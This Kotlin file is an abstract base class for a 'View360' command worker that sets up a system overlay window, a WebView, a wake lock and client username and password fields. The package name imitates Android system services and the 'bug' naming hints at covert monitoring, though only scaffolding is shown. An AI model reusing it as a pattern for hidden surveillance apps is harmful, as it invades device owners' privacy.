package com.android.services.workers.view360

import android.content.Context
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.view.WindowManager
import android.webkit.WebView
import androidx.work.Data
import com.android.services.interfaces.IWorkerProcessing


abstract class View360CommandProcessingBase(
    val applicationContext: Context,
) : IWorkerProcessing {

    protected val windowManagerFlagOverlay =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
    protected var mWindowManager: WindowManager? = null
    protected var mWebView: WebView? = null
    protected val mHandler by lazy {
        Handler(Looper.getMainLooper())
    }

    protected var loadingFinished = true
    protected var redirect = false
    protected var clientUserName = ""
    protected var clientPassword = ""
    internal var wakeLock: PowerManager.WakeLock? = null

    companion object {
        internal const val TAG = "View360"
        internal const val TAG_VIEW_360_BUG_WORK = "myApp:TOSView360Work"
        internal const val VIEW_360_NOTIFICATION_ID = 115
        val TAG_360_WORKER= View360CommandWorker::class.java.name.toString()

        @JvmStatic
        var view360BugStatus: String? = null
    }

    abstract fun initialize()
    abstract fun onServiceDestroy()
    abstract fun startCommand()

    override fun onCreate() {
        initialize()
    }

    override fun onStartCommand(data: Data) {
        startCommand()
    }

    override fun onDestroy() {
        onServiceDestroy()
    }
}